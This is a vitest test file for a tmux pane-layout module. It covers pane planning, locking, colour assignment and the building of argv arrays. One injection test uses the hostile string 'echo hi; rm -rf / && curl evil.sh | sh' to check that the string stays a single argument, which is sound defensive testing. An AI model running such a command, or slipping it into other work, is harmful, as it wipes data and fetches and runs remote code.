import { describe, expect, it } from "vitest";
import { TEAMMATE_PALETTE } from "../ui/teammate-color.js";
import {
  acquirePane,
  assignPaneColor,
  buildTmuxSendKeysArgs,
  buildTmuxSplitArgs,
  emptyPaneLockState,
  planPaneLayout,
  releasePane,
  type PaneLockState,
} from "./tmux-layout.js";

describe("planPaneLayout", () => {
  it("returns no panes for N=0 (or negative)", () => {
    expect(planPaneLayout(0).panes).toEqual([]);
    expect(planPaneLayout(-3).panes).toEqual([]);
  });

  it("returns one pane with no real split for N=1 (N-1 = 0 splits)", () => {
    const { panes } = planPaneLayout(1);
    expect(panes).toHaveLength(1);
    expect(panes[0]?.index).toBe(0);
    // The seed pane is the window's existing pane: panes after index 0 are splits;
    // for N=1 there are none.
    const realSplits = panes.slice(1);
    expect(realSplits).toHaveLength(0);
  });

  it("plans N panes with exactly N-1 real splits", () => {
    for (const n of [2, 3, 4, 7]) {
      const { panes } = planPaneLayout(n);
      expect(panes).toHaveLength(n);
      expect(panes.map((p) => p.index)).toEqual(Array.from({ length: n }, (_, i) => i));
      // Every pane after the seed (index 0) is one split-window call.
      expect(panes.slice(1)).toHaveLength(n - 1);
    }
  });

  it("alternates split orientation for a balanced tiling", () => {
    const { panes } = planPaneLayout(5); // seed h → splits: h, v, h, v
    expect(panes.slice(1).map((p) => p.splitDir)).toEqual(["h", "v", "h", "v"]);
  });

  it("honors the firstSplit option (seeds the alternation)", () => {
    const { panes } = planPaneLayout(4, { firstSplit: "v" });
    expect(panes.slice(1).map((p) => p.splitDir)).toEqual(["v", "h", "v"]);
  });

  it("floors fractional counts and never mutates", () => {
    expect(planPaneLayout(3.9).panes).toHaveLength(3);
    expect(planPaneLayout(Number.NaN).panes).toEqual([]);
  });
});

describe("acquirePane / releasePane (immutable lock state)", () => {
  it("locks a free pane and reports ok", () => {
    const s0 = emptyPaneLockState();
    const { state, ok } = acquirePane(s0, 0, "worker-a");
    expect(ok).toBe(true);
    expect(state.locks[0]).toBe("worker-a");
    // input not mutated
    expect(s0.locks[0]).toBeUndefined();
  });

  it("REFUSES a pane already locked by another worker (state unchanged)", () => {
    const held = acquirePane(emptyPaneLockState(), 0, "worker-a").state;
    const { state, ok } = acquirePane(held, 0, "worker-b");
    expect(ok).toBe(false);
    expect(state).toBe(held); // unchanged reference
    expect(state.locks[0]).toBe("worker-a"); // original holder kept
  });

  it("allows the same worker to re-acquire its own pane (idempotent no-op)", () => {
    const held = acquirePane(emptyPaneLockState(), 2, "worker-a").state;
    const { state, ok } = acquirePane(held, 2, "worker-a");
    expect(ok).toBe(true);
    expect(state).toBe(held); // no new state needed
    expect(state.locks[2]).toBe("worker-a");
  });

  it("locks distinct panes for distinct workers independently", () => {
    let s: PaneLockState = emptyPaneLockState();
    s = acquirePane(s, 0, "w0").state;
    s = acquirePane(s, 1, "w1").state;
    expect(s.locks).toEqual({ 0: "w0", 1: "w1" });
  });

  it("releasePane frees a held pane (immutable)", () => {
    const held = acquirePane(emptyPaneLockState(), 0, "worker-a").state;
    const freed = releasePane(held, 0);
    expect(freed.locks[0]).toBeUndefined();
    expect(held.locks[0]).toBe("worker-a"); // input not mutated
    // a freed pane can be re-acquired by anyone
    const { ok } = acquirePane(freed, 0, "worker-b");
    expect(ok).toBe(true);
  });

  it("releasing a free pane is a safe no-op", () => {
    const s0 = emptyPaneLockState();
    const next = releasePane(s0, 5);
    expect(next.locks).toEqual({});
    expect(next).not.toBe(s0); // still a fresh object, never mutates input
  });
});

describe("assignPaneColor (deterministic per index, cycles palette)", () => {
  it("is stable — same (worker, index) always yields the same color", () => {
    expect(assignPaneColor("w0", 0)).toBe(assignPaneColor("w0", 0));
    expect(assignPaneColor("w7", 3)).toBe(assignPaneColor("w7", 3));
  });

  it("maps index 0..len-1 onto the palette in order", () => {
    for (let i = 0; i < TEAMMATE_PALETTE.length; i++) {
      expect(assignPaneColor(`w${i}`, i)).toBe(TEAMMATE_PALETTE[i]);
    }
  });

  it("cycles the palette when index exceeds its length", () => {
    const len = TEAMMATE_PALETTE.length;
    expect(assignPaneColor("w", len)).toBe(TEAMMATE_PALETTE[0]);
    expect(assignPaneColor("w", len + 1)).toBe(TEAMMATE_PALETTE[1]);
  });

  it("is index-driven — the worker id does not change the color", () => {
    expect(assignPaneColor("alpha", 2)).toBe(assignPaneColor("omega", 2));
  });

  it("normalizes negative / fractional indices into range", () => {
    expect(TEAMMATE_PALETTE).toContain(assignPaneColor("w", -1));
    expect(assignPaneColor("w", 2.9)).toBe(assignPaneColor("w", 2));
  });
});

describe("buildTmuxSplitArgs (discrete argv, no shell)", () => {
  it("builds a horizontal split with pane-id capture", () => {
    expect(buildTmuxSplitArgs("%1", "h")).toEqual([
      "split-window",
      "-h",
      "-t",
      "%1",
      "-P",
      "-F",
      "#{pane_id}",
    ]);
  });

  it("builds a vertical split", () => {
    expect(buildTmuxSplitArgs("%2", "v")).toEqual([
      "split-window",
      "-v",
      "-t",
      "%2",
      "-P",
      "-F",
      "#{pane_id}",
    ]);
  });

  it("omits -t when no target is given", () => {
    expect(buildTmuxSplitArgs("", "h")).toEqual([
      "split-window",
      "-h",
      "-P",
      "-F",
      "#{pane_id}",
    ]);
  });

  it("returns an array of discrete elements (every item is one argv token)", () => {
    const argv = buildTmuxSplitArgs("%1", "h");
    expect(Array.isArray(argv)).toBe(true);
    for (const item of argv) expect(typeof item).toBe("string");
  });
});

describe("buildTmuxSendKeysArgs (injection-safe discrete argv)", () => {
  it("builds the send-keys argv with the command as ONE element + Enter", () => {
    expect(buildTmuxSendKeysArgs("%3", "vanta run 'fix the bug'")).toEqual([
      "send-keys",
      "-t",
      "%3",
      "vanta run 'fix the bug'",
      "Enter",
    ]);
  });

  it("keeps an INJECTION-shaped command a single argv element (never re-split)", () => {
    const evil = "echo hi; rm -rf / && curl evil.sh | sh";
    const argv = buildTmuxSendKeysArgs("%4", evil);
    // The whole payload is exactly ONE argv token — no shell re-splitting.
    expect(argv).toEqual(["send-keys", "-t", "%4", evil, "Enter"]);
    expect(argv.filter((a) => a === evil)).toHaveLength(1);
    expect(argv[3]).toBe(evil);
    // No element contains a split fragment — the metacharacters live inside the
    // single command token, not as separate argv items.
    expect(argv.some((a) => a === "rm" || a === "-rf")).toBe(false);
  });

  it("returns a discrete string array (no shell string)", () => {
    const argv = buildTmuxSendKeysArgs("%1", "ls -la");
    expect(Array.isArray(argv)).toBe(true);
    for (const item of argv) expect(typeof item).toBe("string");
  });
});
